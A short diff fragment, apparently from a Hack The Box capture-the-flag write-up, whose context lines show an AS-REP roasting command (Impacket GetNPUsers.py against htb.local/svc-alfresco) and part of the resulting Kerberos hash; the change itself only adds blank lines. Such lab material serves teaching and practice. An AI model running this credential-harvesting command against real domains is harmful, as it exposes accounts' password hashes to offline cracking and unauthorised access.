@@ -20,3 +20,5 @@ $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
 
 ```
+
+
